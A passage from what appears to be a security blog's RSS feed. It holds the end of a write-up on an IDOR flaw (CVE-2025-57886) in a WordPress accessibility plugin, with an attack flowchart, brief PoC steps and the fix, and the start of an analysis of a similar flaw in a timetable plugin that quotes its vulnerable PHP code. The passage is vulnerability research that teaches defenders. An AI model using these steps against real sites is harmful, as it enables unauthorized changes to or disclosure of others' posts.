0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated attacker (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Craft POST request to REST API&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;POST /wp-json/accessibility-checker/v1/post-scan-results/{id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Manipulate {id} to target post_id&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Permission granted&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;set_post_scan_results()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;get_post(target_post_id)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Process violations data&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;update_post_meta(target_post_id, *edac**)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Target post data modified&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create/edit a post with a &lt;strong&gt;Contributor&lt;/strong&gt; account.&lt;/li&gt;&#xA;&lt;li&gt;Capture the request to &lt;code&gt;/wp-json/accessibility-checker/v1/post-scan-results/{id}&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with the &lt;code&gt;id&lt;/code&gt; of another user&amp;rsquo;s post and arbitrary &lt;code&gt;violations&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-57886 is an &lt;strong&gt;IDOR vulnerability in the REST API&lt;/strong&gt; caused by the &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; plugin only checking permissions at a &lt;strong&gt;general capability level (&lt;code&gt;edit_posts&lt;/code&gt;)&lt;/strong&gt; without validating &lt;strong&gt;editing permissions on a specific post&lt;/strong&gt;. This allows an attacker with Contributor privileges to &lt;strong&gt;arbitrarily manipulate the &lt;code&gt;id&lt;/code&gt; parameter&lt;/strong&gt; in the REST API request to &lt;strong&gt;write or overwrite accessibility data&lt;/strong&gt; on posts they do not own, leading to &lt;strong&gt;unauthorized data modification&lt;/strong&gt;. Version 1.30.1 fixed this by applying &lt;strong&gt;post-level authorization&lt;/strong&gt; via &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;REST APIs using &lt;strong&gt;client-controlled object identifiers&lt;/strong&gt; must always include &lt;strong&gt;permission checks on the specific object&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;A &lt;strong&gt;Global capability check&lt;/strong&gt; (&lt;code&gt;edit_posts&lt;/code&gt;) is insufficient to protect data-writing operations based on &lt;code&gt;post_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR can occur even when the request is generated from &lt;strong&gt;valid client-side logic&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;In WordPress, &lt;strong&gt;&lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;&lt;/strong&gt; is the standard measure to prevent post-level IDOR.&lt;/li&gt;&#xA;&lt;li&gt;REST endpoints that &lt;strong&gt;write data&lt;/strong&gt; should be considered priority attack surfaces during plugin audits.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/accessibility-checker/vulnerability/wordpress-accessibility-checker-by-equalize-digital-plugin-1-30-0-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin &amp;lt;= 1.30.0 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;&#xA;</description>
    </item>
    <item>
      <title>CVE-2025-12954 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-21-cve-2025-12954/</link>
      <pubDate>Sun, 21 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-21-cve-2025-12954/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Timetable and Event Schedule by MotoPress&lt;/strong&gt; WordPress plugin prior to version &lt;strong&gt;2.4.16&lt;/strong&gt; does not verify whether a user has permission to access a specific event when performing the duplicate action, allowing users with roles as low as &lt;strong&gt;Contributor&lt;/strong&gt; to arbitrarily disclose events.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12954&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12954&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mp-timetable/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Timetable and Event Schedule&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.15&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt; * &lt;code&gt;2.4.16&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin has registered an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;post_action_mptt_duplicate_event&amp;#39;, array( $this-&amp;gt;get( &amp;#39;events&amp;#39; ), &amp;#39;post_action_mptt_duplicate_event&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In &lt;strong&gt;WordPress&lt;/strong&gt;, hooks with the &lt;code&gt;post_action_&lt;/code&gt; prefix are special hooks used to handle actions passed via the &lt;code&gt;action&lt;/code&gt; parameter when accessing the &lt;code&gt;post.php&lt;/code&gt; file.&#xA;Specifically, when a user accesses a URL like:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/post.php?post=post_id&amp;amp;action=mptt_duplicate_event&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress will call the &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; callback to process the &lt;strong&gt;duplicate event&lt;/strong&gt; logic.&lt;/p&gt;&#xA;&lt;p&gt;In addition to registering the action hook, the plugin also &lt;strong&gt;proactively creates a URL to trigger this action&lt;/strong&gt; by adding a &amp;ldquo;Duplicate&amp;rdquo; link to the action list of each post in the admin dashboard.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_row_actions( $actions, $post ) {&#xA;    if ( $post-&amp;gt;post_type == $this-&amp;gt;post_type &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $action_url = add_query_arg(&#xA;            array(&#xA;                &amp;#39;post&amp;#39; =&amp;gt; $post-&amp;gt;ID,&#xA;                &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;mptt_duplicate_event&amp;#39;,&#xA;                &amp;#39;_wpnonce&amp;#39; =&amp;gt; wp_create_nonce( &amp;#39;mptt_duplicate_event&amp;#39; )&#xA;            ),&#xA;            admin_url( &amp;#39;post.php&amp;#39; )&#xA;        );&#xA;&#xA;        $actions[&amp;#39;duplicate&amp;#39;] = &amp;#39;&amp;lt;a href=&amp;#34;&amp;#39; . $action_url . &amp;#39;&amp;#34; aria-label=&amp;#34;&amp;#39; .&#xA;            __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;#34; rel=&amp;#34;permalink&amp;#34;&amp;gt;&amp;#39; . __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;lt;/a&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    return $actions;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function uses the &lt;code&gt;post_row_actions&lt;/code&gt; hook to &lt;strong&gt;add a Duplicate link&lt;/strong&gt; to the action list of each post in the admin.&lt;/p&gt;&#xA;&lt;p&gt;The link is only displayed when the post matches the correct &lt;code&gt;post_type&lt;/code&gt; and the user has &lt;code&gt;edit_posts&lt;/code&gt; permissions (Contributor+).&#xA;The generated URL points to &lt;code&gt;post.php&lt;/code&gt; with &lt;code&gt;post&lt;/code&gt; (Post ID), &lt;code&gt;action&lt;/code&gt; (&lt;code&gt;mptt_duplicate_event&lt;/code&gt;), and &lt;code&gt;_wpnonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;When a user clicks &lt;strong&gt;Duplicate&lt;/strong&gt;, WordPress will trigger the &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; hook to process post duplication.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; title=&#34;Duplicate link in each Event&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; data-sub-html=&#34;&lt;h2&gt;Duplicate&lt;/h2&gt;&lt;p&gt;Duplicate link in each Event&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#39; alt=&#34;Duplicate&#34; height=&#34;483&#34; width=&#34;875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Duplicate link in each Event&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_action_mptt_duplicate_event( $post_id ) {&#xA;    global $wpdb;&#xA;&#xA;    $post_type = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $post_id ) {&#xA;        $post = get_post( $post_id );&#xA;    }&#xA;&#xA;    if ( $post ) {&#xA;        $post_type = $post-&amp;gt;post_type;&#xA;    }&#xA;&#xA;    if ( $post_type !== $this-&amp;gt;post_type ) {&#xA;        wp_die( __( &amp;#39;A post type mismatch has been detected.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    $nonce = sanitize_key( $_REQUEST[&amp;#39;_wpnonce&amp;#39;] );&#xA;&#xA;    if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $current_user = wp_get_current_user();&#xA;        $new_post_author = $current_user-&amp;gt;ID;&#xA;&#xA;        /*&#xA;            * new post data array&#xA;            */&#xA;        $args = array(&#xA;            &amp;#39;comment_status&amp;#39; =&amp;gt; $post-&amp;gt;comment_status,&#xA;            &amp;#39;ping_status&amp;#39;    =&amp;gt; $post-&amp;gt;ping_status,&#xA;            &amp;#39;post_author&amp;#39;    =&amp;gt; $new_post_author,&#xA;            &amp;#39;post_content&amp;#39;   =&amp;gt; $post-&amp;gt;post_content,&#xA;            &amp;#39;post_excerpt&amp;#39;   =&amp;gt; $post-&amp;gt;post_excerpt,&#xA;            &amp;#39;post_name&amp;#39;      =&amp;gt; $post-&amp;gt;post_name,&#xA;            &amp;#39;post_parent&amp;#39;    =&amp;gt; $post-&amp;gt;post_parent,&#xA;            &amp;#39;post_password&amp;#39;  =&amp;gt; $post-&amp;gt;post_password,&#xA;            &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;draft&amp;#39;,&#xA;            // translators: New post title of the duplicated post&#xA;            &amp;#39;post_title&amp;#39;     =&amp;gt; sprintf( __(&amp;#39;%s - Copy&amp;#39;, &amp;#39;mp-timetable&amp;#39;), $post-&amp;gt;post_title ),&#xA;            &amp;#39;post_type&amp;#39;      =&amp;gt; $post-&amp;gt;post_type,&#xA;            &amp;#39;to_ping&amp;#39;        =&amp;gt; $post-&amp;gt;to_ping,&#xA;            &amp;#39;menu_order&amp;#39;     =&amp;gt; $post-&amp;gt;menu_order&#xA;        );&#xA;&#xA;        /*&#xA;            * insert the post by wp_insert_post() function&#xA;            */&#xA;        $new_post_id = wp_insert_post( $args );&#xA;&#xA;        if( is_wp_error($new_post_id) ) {&#xA;            wp_die( $post_id-&amp;gt;get_error_message() );&#xA;        }&#xA;&#xA;        /*&#xA;            * get all current post terms and set them to the new post draft&#xA;            */&#xA;        $taxonomies = get_object_taxonomies($post-&amp;gt;post_type);&#xA;        foreach ($taxonomies as $taxonomy) {&#xA;            $post_terms = wp_get_object_terms($post_id, $taxonomy, array(&amp;#39;fields&amp;#39; =&amp;gt; &amp;#39;slugs&amp;#39;));&#xA;            wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate all post meta&#xA;            */&#xA;        $post_meta_keys = \get_post_custom_keys( $post_id );&#xA;&#xA;        if ( ! empty( $post_meta_keys ) ) {&#xA;&#xA;            $meta_excludelist = [&#xA;                &amp;#39;_edit_lock&amp;#39;,&#xA;                &amp;#39;_edit_last&amp;#39;,&#xA;                &amp;#39;_wp_old_slug&amp;#39;&#xA;            ];&#xA;&#xA;            $meta_keys = \array_diff( $post_meta_keys, $meta_excludelist );&#xA;&#xA;            foreach ( $meta_keys as $meta_key ) {&#xA;                $meta_values = \get_post_custom_values( $meta_key, $post_id );&#xA;&#xA;                // Clear existing meta data&#xA;                \delete_post_meta( $new_post_id, $meta_key );&#xA;&#xA;                foreach ( $meta_values as $meta_value ) {&#xA;                    $meta_value = \maybe_unserialize( $meta_value );&#xA;                    \add_post_meta( $new_post_id, $meta_key, addslashes( $meta_value ) );&#xA;                }&#xA;            }&#xA;&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate timeslots in custom BD&#xA;            */&#xA;        $timeslots = $this-&amp;gt;wpdb-&amp;gt;get_results( &#xA;            $this-&amp;gt;wpdb-&amp;gt;prepare(&amp;#34;SELECT * FROM {$this-&amp;gt;table_name} WHERE event_id = %d&amp;#34;, $post_id ), &#xA;        OBJECT );&#xA;&#xA;        if ( !empty($timeslots) ) {&#xA;&#xA;            foreach ( $timeslots as $timeslot ) {&#xA;                $wpdb-&amp;gt;insert(&#xA;                    $this-&amp;gt;table_name,&#xA;                    array(&#xA;                        &amp;#39;column_id&amp;#39;   =&amp;gt; $timeslot-&amp;gt;column_id,&#xA;                        &amp;#39;event_id&amp;#39;    =&amp;gt; $new_post_id,&#xA;                        &amp;#39;event_start&amp;#39; =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_start ) ),&#xA;                        &amp;#39;event_end&amp;#39;   =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_end ) ),&#xA;                        &amp;#39;user_id&amp;#39;     =&amp;gt; $timeslot-&amp;gt;user_id,&#xA;                        &amp;#39;description&amp;#39; =&amp;gt; $timeslot-&amp;gt;description&#xA;                    )&#xA;                );&#xA;            }&#xA;        }&#xA;&#xA;        /*&#xA;            * redirect to the edit post screen for the new draft&#xA;            */&#xA;        wp_safe_redirect( get_edit_post_link( $new_post_id, &amp;#39;&amp;#39; ) );&#xA;        exit();&#xA;&#xA;    } else {&#xA;        wp_die( __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function performs the duplication of the post with ID &lt;code&gt;$post_id&lt;/code&gt;, however:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the main cause leading to IDOR (Insecure Direct Object Reference).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_posts&lt;/code&gt; is a &lt;strong&gt;generic&lt;/strong&gt; permission, not attached to a &lt;strong&gt;specific post&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Contributors and above all have this permission.&lt;/li&gt;&#xA;&lt;li&gt;There is no check for:&lt;/li&gt;&#xA;&lt;li&gt;whether the post belongs to the current user&lt;/li&gt;&#xA;&lt;li&gt;whether the user has permission to edit the &lt;strong&gt;specific post_id&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post = get_post( $post_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The post is retrieved 